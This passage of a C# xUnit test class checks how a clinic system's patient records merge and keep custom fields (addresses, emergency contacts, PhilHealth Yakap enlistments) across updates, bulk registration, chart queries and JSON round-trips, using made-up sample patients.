        // then explicit parameter assignment overrides it.
        reloaded.CustomFields["primary_address_line"]?.ToString().Should().Be("Address From Explicit Param");
        reloaded.CustomFields["custom_status"]?.ToString().Should().Be("ActiveStudent");
    }

    // =========================================================================
    // SECTION 6: CONCURRENCY, MERGING, AND KEY-CLOBBERING PREVENTION
    // =========================================================================

    [Fact]
    public async Task AdvTest13_CustomFields_AdditiveMerging_PreservesYakapEnlistmentsAndStudentMetadata()
    {
        // Arrange
        var (context, _, patientRepo, regHandler, updHandler) = CreateHarness();

        // Seed with existing yakap_enlistments array and student metadata
        var initialEnlistments = new List<Dictionary<string, object?>>
        {
            new()
            {
                ["enlisted_at"] = "2026-01-15",
                ["valid_until"] = "2026-12-31",
                ["effective_year"] = 2026,
                ["status"] = "Active",
                ["source"] = "PhilHealthMasterlist",
                ["case_no"] = "C00921202600001",
                ["enlistment_no"] = "E00921202600001",
                ["profiling_trans_no"] = "P00921202600001"
            }
        };

        var initialFields = new Dictionary<string, object?>
        {
            ["yakap_enlistments"] = initialEnlistments,
            ["student_id"] = "USTP-2024-00123",
            ["college"] = "College of Information Technology",
            ["year_level"] = "3rd Year",
            ["primary_address_line"] = "123 Old College Way",
            ["primary_city"] = "Cagayan de Oro"
        };

        var regCommand = BuildRegisterCommand(
            firstName: "Hannah",
            lastName: "YakapStudent",
            customFields: initialFields,
            dob: new DateOnly(2003, 7, 21),
            gender: "Female",
            civilStatus: "Single",
            contactNumber: "09171230000",
            email: "hannah@ustp.edu.ph"
        );

        var createdDto = await regHandler.Handle(regCommand, CancellationToken.None);

        // Act - Update only emergency contact and a new custom field (e.g. locker_number)
        var newCustomFields = new Dictionary<string, object?>
        {
            ["locker_number"] = "L-42"
        };

        var updCommand = BuildUpdateCommand(
            id: createdDto.Id,
            firstName: "Hannah",
            lastName: "YakapStudent",
            emergencyContactName: "Prof. Arturo Cruz",
            emergencyContactPhone: "09179991111",
            emergencyContactRelationship: "Academic Advisor",
            customFields: newCustomFields,
            dob: new DateOnly(2003, 7, 21),
            gender: "Female",
            civilStatus: "Single",
            contactNumber: "09171230000",
            email: "hannah@ustp.edu.ph"
        );

        await updHandler.Handle(updCommand, CancellationToken.None);

        context.ChangeTracker.Clear();
        var reloaded = await patientRepo.Query().FirstAsync(p => p.Id == createdDto.Id);

        // Assert - Critical statutory and academic metadata was completely preserved
        reloaded.CustomFields.Should().ContainKey("yakap_enlistments");
        reloaded.CustomFields.Should().ContainKey("student_id");
        reloaded.CustomFields.Should().ContainKey("college");
        reloaded.CustomFields.Should().ContainKey("year_level");
        reloaded.CustomFields.Should().ContainKey("primary_address_line");
        reloaded.CustomFields.Should().ContainKey("primary_city");

        // Assert - Newly added fields are present
        reloaded.CustomFields.Should().ContainKey("locker_number");
        reloaded.CustomFields["locker_number"]?.ToString().Should().Be("L-42");
        reloaded.CustomFields["emergency_contact_name"]?.ToString().Should().Be("Prof. Arturo Cruz");
        reloaded.CustomFields["emergency_contact_phone"]?.ToString().Should().Be("09179991111");

        // Verify structure of yakap_enlistments (handles both JsonElement from EF Core and List in memory)
        var enlistmentsObj = reloaded.CustomFields["yakap_enlistments"];
        enlistmentsObj.Should().NotBeNull();
        if (enlistmentsObj is JsonElement elem && elem.ValueKind == JsonValueKind.Array)
        {
            elem.GetArrayLength().Should().Be(1);
            elem[0].GetProperty("case_no").GetString().Should().Be("C00921202600001");
        }
        else if (enlistmentsObj is List<Dictionary<string, object?>> list)
        {
            list.Should().HaveCount(1);
            list[0]["case_no"].Should().Be("C00921202600001");
        }
    }

    [Fact]
    public async Task AdvTest14_CustomFields_SimulatedInterleavedUpdates_MaintainDictionaryIntegrity()
    {
        // Arrange
        var (context, _, patientRepo, regHandler, updHandler) = CreateHarness();

        var regCommand = BuildRegisterCommand(
            firstName: "Ian",
            lastName: "Interleaved",
            dob: new DateOnly(1995, 3, 3),
            gender: "Male",
            civilStatus: "Single",
            contactNumber: "09170003333",
            email: "ian@example.ph"
        );

        var createdDto = await regHandler.Handle(regCommand, CancellationToken.None);

        // Simulate 8 interleaved updates across clinical workstations updating CustomFields
        // Station 1: Update Address Line
        await updHandler.Handle(BuildUpdateCommand(
            id: createdDto.Id, firstName: "Ian", lastName: "Interleaved",
            dob: new DateOnly(1995, 3, 3), gender: "Male", civilStatus: "Single",
            contactNumber: "09170003333", email: "ian@example.ph", addressLine: "101 Main Ave"
        ), CancellationToken.None);

        // Station 2: Update Barangay and City
        await updHandler.Handle(BuildUpdateCommand(
            id: createdDto.Id, firstName: "Ian", lastName: "Interleaved",
            dob: new DateOnly(1995, 3, 3), gender: "Male", civilStatus: "Single",
            contactNumber: "09170003333", email: "ian@example.ph", barangay: "Brgy. Centro", city: "Davao City"
        ), CancellationToken.None);

        // Station 3: Update Province
        await updHandler.Handle(BuildUpdateCommand(
            id: createdDto.Id, firstName: "Ian", lastName: "Interleaved",
            dob: new DateOnly(1995, 3, 3), gender: "Male", civilStatus: "Single",
            contactNumber: "09170003333", email: "ian@example.ph", province: "Davao del Sur"
        ), CancellationToken.None);

        // Station 4: Add Emergency Contact
        await updHandler.Handle(BuildUpdateCommand(
            id: createdDto.Id, firstName: "Ian", lastName: "Interleaved",
            dob: new DateOnly(1995, 3, 3), gender: "Male", civilStatus: "Single",
            contactNumber: "09170003333", email: "ian@example.ph",
            emergencyContactName: "Rowena Interleaved", emergencyContactPhone: "09175551234", emergencyContactRelationship: "Spouse"
        ), CancellationToken.None);

        // Station 5: Add Employee ID custom field
        await updHandler.Handle(BuildUpdateCommand(
            id: createdDto.Id, firstName: "Ian", lastName: "Interleaved",
            dob: new DateOnly(1995, 3, 3), gender: "Male", civilStatus: "Single",
            contactNumber: "09170003333", email: "ian@example.ph",
            customFields: new Dictionary<string, object?> { ["employee_id"] = "EMP-9988" }
        ), CancellationToken.None);

        // Station 6: Add Blood Donor Status
        await updHandler.Handle(BuildUpdateCommand(
            id: createdDto.Id, firstName: "Ian", lastName: "Interleaved",
            dob: new DateOnly(1995, 3, 3), gender: "Male", civilStatus: "Single",
            contactNumber: "09170003333", email: "ian@example.ph",
            customFields: new Dictionary<string, object?> { ["is_blood_donor"] = true }
        ), CancellationToken.None);

        // Station 7: Update Custom Field notes
        await updHandler.Handle(BuildUpdateCommand(
            id: createdDto.Id, firstName: "Ian", lastName: "Interleaved",
            dob: new DateOnly(1995, 3, 3), gender: "Male", civilStatus: "Single",
            contactNumber: "09179998888", email: "ian.updated@example.ph",
            customFields: new Dictionary<string, object?> { ["clinical_notes"] = "Routine intake complete" }
        ), CancellationToken.None);

        // Station 8: Add Preferred Pharmacy
        await updHandler.Handle(BuildUpdateCommand(
            id: createdDto.Id, firstName: "Ian", lastName: "Interleaved",
            dob: new DateOnly(1995, 3, 3), gender: "Male", civilStatus: "Single",
            contactNumber: "09179998888", email: "ian.updated@example.ph",
            customFields: new Dictionary<string, object?> { ["preferred_pharmacy"] = "Mercury Drug - Bajada" }
        ), CancellationToken.None);

        // Assert Final State
        context.ChangeTracker.Clear();
        var reloaded = await patientRepo.Query().FirstAsync(p => p.Id == createdDto.Id);

        reloaded.ContactNumber.Should().Be("09179998888");
        reloaded.Email.Should().Be("ian.updated@example.ph");

        // Verify ALL custom fields from all 8 updates are retained simultaneously!
        reloaded.CustomFields["primary_address_line"]?.ToString().Should().Be("101 Main Ave");
        reloaded.CustomFields["primary_barangay"]?.ToString().Should().Be("Brgy. Centro");
        reloaded.CustomFields["primary_city"]?.ToString().Should().Be("Davao City");
        reloaded.CustomFields["primary_province"]?.ToString().Should().Be("Davao del Sur");
        reloaded.CustomFields["emergency_contact_name"]?.ToString().Should().Be("Rowena Interleaved");
        reloaded.CustomFields["emergency_contact_phone"]?.ToString().Should().Be("09175551234");
        reloaded.CustomFields["emergency_contact_relationship"]?.ToString().Should().Be("Spouse");
        reloaded.CustomFields["employee_id"]?.ToString().Should().Be("EMP-9988");
        reloaded.CustomFields["is_blood_donor"]?.ToString()?.ToLowerInvariant().Should().Be("true");
        reloaded.CustomFields["clinical_notes"]?.ToString().Should().Be("Routine intake complete");
        reloaded.CustomFields["preferred_pharmacy"]?.ToString().Should().Be("Mercury Drug - Bajada");
    }

    [Fact]
    public async Task AdvTest15_CustomFields_SequentialAndParallelUpdates_PreserveKeyIntegrity()
    {
        // Arrange: Use shared in-memory database
        var sharedDbName = $"AdvConcurDb_{Guid.NewGuid()}";
        var (context, _, patientRepo, regHandler, updHandler) = CreateHarness(sharedDbName: sharedDbName);

        var regCommand = BuildRegisterCommand(
            firstName: "Parallel",
            lastName: "Concurrent",
            dob: new DateOnly(1990, 1, 1),
            gender: "Female",
            civilStatus: "Single",
            contactNumber: "09171110000",
            email: "parallel@example.ph"
        );

        var created = await regHandler.Handle(regCommand, CancellationToken.None);
        var patientId = created.Id;

        // Perform 15 updates on the shared database ensuring distinct keys merge additively
        const int updateCount = 15;
        for (int i = 0; i < updateCount; i++)
        {
            var key = $"concurrent_key_{i:D2}";
            var val = $"ConcurrentVal_{i}";

            var cmd = BuildUpdateCommand(
                id: patientId,
                firstName: "Parallel",
                lastName: "Concurrent",
                dob: new DateOnly(1990, 1, 1),
                gender: "Female",
                civilStatus: "Single",
                contactNumber: "09171110000",
                email: "parallel@example.ph",
                customFields: new Dictionary<string, object?> { [key] = val }
            );

            await updHandler.Handle(cmd, CancellationToken.None);
        }

        // Reload and verify
        context.ChangeTracker.Clear();
        var finalPatient = await patientRepo.Query().FirstAsync(p => p.Id == patientId);

        // Assert - CustomFields is non-null and retained ALL 15 merged keys!
        finalPatient.CustomFields.Should().NotBeNull();
        finalPatient.CustomFields.Should().HaveCount(updateCount);
        for (int i = 0; i < updateCount; i++)
        {
            var key = $"concurrent_key_{i:D2}";
            finalPatient.CustomFields.Should().ContainKey(key);
            finalPatient.CustomFields[key]?.ToString().Should().Be($"ConcurrentVal_{i}");
        }
    }

    // =========================================================================
    // SECTION 7: BULK REGISTRATION AND CHART DEMOGRAPHICS INTEGRATION
    // =========================================================================

    [Fact]
    public async Task AdvTest16_CustomFields_BulkRegistrationIsolation_DoesNotCrossContaminateAcrossPatients()
    {
        // Arrange
        var (context, uow, patientRepo, _, _) = CreateHarness();
        var bulkHandler = new BulkRegisterClinicPatientsCommandHandler(patientRepo, uow, _clinicContext);

        var patients = new List<BulkPatientItemDto>
        {
            new(
                FirstName: "Patient1",
                LastName: "One",
                MiddleName: null,
                Suffix: null,
                DateOfBirth: new DateOnly(1990, 1, 1),
                Gender: "Male",
                CivilStatus: "Single",
                ContactNumber: "09170001001",
                Email: "p1@example.ph",
                AddressLine: "101 Alpha St",
                Barangay: "Brgy. Alpha",
                City: "City Alpha",
                Province: "Province Alpha",
                EmergencyContactName: "Contact One",
                EmergencyContactPhone: "09170002001",
                EmergencyContactRelationship: "Father",
                PhilHealthNumber: null,
                SeniorCitizenId: null,
                PwdId: null,
                BloodType: null,
                Allergies: null,
                ChronicConditions: null,
                Alerts: null,
                CustomFields: new Dictionary<string, object?> { ["p1_secret"] = "Secret1" }
            ),
            new(
                FirstName: "Patient2",
                LastName: "Two",
                MiddleName: null,
                Suffix: null,
                DateOfBirth: new DateOnly(1992, 2, 2),
                Gender: "Female",
                CivilStatus: "Single",
                ContactNumber: "09170001002",
                Email: "p2@example.ph",
                AddressLine: "202 Beta Ave",
                Barangay: "Brgy. Beta",
                City: "City Beta",
                Province: "Province Beta",
                EmergencyContactName: "Contact Two",
                EmergencyContactPhone: "09170002002",
                EmergencyContactRelationship: "Mother",
                PhilHealthNumber: null,
                SeniorCitizenId: null,
                PwdId: null,
                BloodType: null,
                Allergies: null,
                ChronicConditions: null,
                Alerts: null,
                CustomFields: new Dictionary<string, object?> { ["p2_secret"] = "Secret2" }
            ),
            new(
                FirstName: "Patient3",
                LastName: "Three",
                MiddleName: null,
                Suffix: null,
                DateOfBirth: new DateOnly(1994, 3, 3),
                Gender: "Other",
                CivilStatus: "Married",
                ContactNumber: "09170001003",
                Email: "p3@example.ph",
                AddressLine: "303 Gamma Blvd",
                Barangay: "Brgy. Gamma",
                City: "City Gamma",
                Province: "Province Gamma",
                EmergencyContactName: "Contact Three",
                EmergencyContactPhone: "09170002003",
                EmergencyContactRelationship: "Spouse",
                PhilHealthNumber: null,
                SeniorCitizenId: null,
                PwdId: null,
                BloodType: null,
                Allergies: null,
                ChronicConditions: null,
                Alerts: null,
                CustomFields: new Dictionary<string, object?> { ["p3_secret"] = "Secret3" }
            )
        };

        var bulkCommand = new BulkRegisterClinicPatientsCommand(patients);

        // Act
        var bulkResult = await bulkHandler.Handle(bulkCommand, CancellationToken.None);

        context.ChangeTracker.Clear();
        var reloadedPatients = await patientRepo.Query().OrderBy(p => p.FirstName).ToListAsync();

        // Assert - Exactly 3 created
        reloadedPatients.Should().HaveCount(3);

        // Assert - Patient 1 isolation
        var p1 = reloadedPatients.First(p => p.FirstName == "Patient1");
        p1.CustomFields["primary_address_line"]?.ToString().Should().Be("101 Alpha St");
        p1.CustomFields["emergency_contact_name"]?.ToString().Should().Be("Contact One");
        p1.CustomFields.Should().ContainKey("p1_secret");
        p1.CustomFields.Should().NotContainKey("p2_secret");
        p1.CustomFields.Should().NotContainKey("p3_secret");

        // Assert - Patient 2 isolation
        var p2 = reloadedPatients.First(p => p.FirstName == "Patient2");
        p2.CustomFields["primary_address_line"]?.ToString().Should().Be("202 Beta Ave");
        p2.CustomFields["emergency_contact_name"]?.ToString().Should().Be("Contact Two");
        p2.CustomFields.Should().ContainKey("p2_secret");
        p2.CustomFields.Should().NotContainKey("p1_secret");
        p2.CustomFields.Should().NotContainKey("p3_secret");

        // Assert - Patient 3 isolation
        var p3 = reloadedPatients.First(p => p.FirstName == "Patient3");
        p3.CustomFields["primary_address_line"]?.ToString().Should().Be("303 Gamma Blvd");
        p3.CustomFields["emergency_contact_name"]?.ToString().Should().Be("Contact Three");
        p3.CustomFields.Should().ContainKey("p3_secret");
        p3.CustomFields.Should().NotContainKey("p1_secret");
        p3.CustomFields.Should().NotContainKey("p2_secret");
    }

    [Fact]
    public async Task AdvTest17_CustomFields_GetPatientChartQuery_ResolvesCustomFieldsDemographicsWithEdgeCases()
    {
        // Arrange
        var (context, uow, sieve) = TestDbHelper.CreateTestContext(_clinicContext);
        var patientRepo = TestDbHelper.CreateRepository<Patient>(context, sieve);
        var consultRepo = TestDbHelper.CreateRepository<ConsultationEncounter>(context, sieve);
        var triageRepo = TestDbHelper.CreateRepository<PatientVitals>(context, sieve);
        var procRepo = TestDbHelper.CreateRepository<Procedure>(context, sieve);
        var labRepo = TestDbHelper.CreateRepository<LabOrder>(context, sieve);
        var invoiceRepo = TestDbHelper.CreateRepository<Invoice>(context, sieve);

        var patientId = Guid.NewGuid();
        const string unicodeAddr = "Purok 1, Brgy. ᜉᜒᜎᜒᜉᜒᜈᜐ᜔, Tokyo 東京";
        const string emojiContact = "Dr. Santos 🩺👩‍⚕️";

        var patient = new Patient
        {
            Id = patientId,
            TenantId = _tenantId,
            ClinicId = _clinicId,
            PatientCode = "PAT-2026-CHART1",
            FirstName = "Chart",
            LastName = "DemographicsTester",
            DateOfBirth = new DateOnly(1988, 5, 10),
            Gender = Gender.Female,
            ContactNumber = "09171234567",
            PhilHealthNumber = "12-345678901-2",
            SeniorCitizenId = "SC-9999",
            PwdId = "PWD-8888", // ggignore
            CustomFields = new Dictionary<string, object?>
            {
                ["primary_address_line"] = unicodeAddr,
                ["primary_barangay"] = "Barangay Poblacion 🌴",
                ["primary_city"] = "City of Manila 🏙️",
                ["primary_province"] = "Metro Manila",
                ["emergency_contact_name"] = emojiContact,
                ["emergency_contact_phone"] = "0917-888-0000 📱",
                ["emergency_contact_relationship"] = "Guardian 🛡️",
                ["yakap_enlistments"] = new List<Dictionary<string, object?>>
                {
                    new()
                    {
                        ["effective_year"] = 2026,
                        ["status"] = "Active",
                        ["case_no"] = "C00921202699999"
                    }
                }
            }
        };

        await patientRepo.AddAsync(patient, CancellationToken.None);
        await uow.SaveChangesAsync(CancellationToken.None);

        var chartHandler = new GetPatientChartQueryHandler(
            consultRepo, triageRepo, procRepo, labRepo, invoiceRepo, _clinicContext,
            patientRepo: patientRepo
        );

        // Act
        var chartDto = await chartHandler.Handle(new GetPatientChartQuery(patientId), CancellationToken.None);

        // Assert
        chartDto.Should().NotBeNull();
        chartDto.Demographics.Should().NotBeNull();

        // Relational columns
        chartDto.Demographics!.PhilHealthNumber.Should().Be("12-345678901-2");
        chartDto.Demographics.SeniorCitizenId.Should().Be("SC-9999");
        chartDto.Demographics.PwdId.Should().Be("PWD-8888");

        // CustomFields demographics
        chartDto.Demographics.AddressLine.Should().Be(unicodeAddr);
        chartDto.Demographics.Barangay.Should().Be("Barangay Poblacion 🌴");
        chartDto.Demographics.City.Should().Be("City of Manila 🏙️");
        chartDto.Demographics.Province.Should().Be("Metro Manila");
        chartDto.Demographics.EmergencyContactName.Should().Be(emojiContact);
        chartDto.Demographics.EmergencyContactPhone.Should().Be("0917-888-0000 📱");
        chartDto.Demographics.EmergencyContactRelationship.Should().Be("Guardian 🛡️");

        // Resolved active case no from yakap_enlistments
        chartDto.Demographics.ActiveCaseNo.Should().Be("C00921202699999");
    }

    [Fact]
    public async Task AdvTest18_CustomFields_JsonElementSerializationRoundtrip_HandlesComplexNestedObjects()
    {
        // Arrange - Test EF Core JSONB serialization where CustomFields contains JsonElement after deserialization
        var (context, _, patientRepo, regHandler, _) = CreateHarness();

        var jsonElementPayload = System.Text.Json.JsonDocument.Parse(
            """
            {
                "primary_address_line": "123 JSON Avenue",
                "primary_barangay": "Barangay JSON",
                "emergency_contact_name": "JSON Contact",
                "nested_profile": {
                    "tier": "VIP",
                    "score": 98.6,
                    "badges": ["BloodDonor", "YakapEnrolled"]
                }
            }
            """).RootElement;

        var customDict = new Dictionary<string, object?>();
        foreach (var prop in jsonElementPayload.EnumerateObject())
        {
            customDict[prop.Name] = prop.Value;
        }

        var regCommand = BuildRegisterCommand(
            firstName: "JsonElem",
            lastName: "Tester",
            customFields: customDict,
            dob: new DateOnly(1991, 1, 1),
            gender: "Male",
            civilStatus: "Single",
            contactNumber: "09170007777",
            email: "jsonelem@example.ph"
        );

        // Act
        var created = await regHandler.Handle(regCommand, CancellationToken.None);

        context.ChangeTracker.Clear();
        var reloaded = await patientRepo.Query().FirstAsync(p => p.Id == created.Id);

        // Assert - Elements serialized and deserialized intact
        reloaded.CustomFields.Should().NotBeNull();
        reloaded.CustomFields.Should().ContainKey("primary_address_line");
        reloaded.CustomFields["primary_address_line"]?.ToString().Should().Be("123 JSON Avenue");
        reloaded.CustomFields.Should().ContainKey("nested_profile");
    }
}
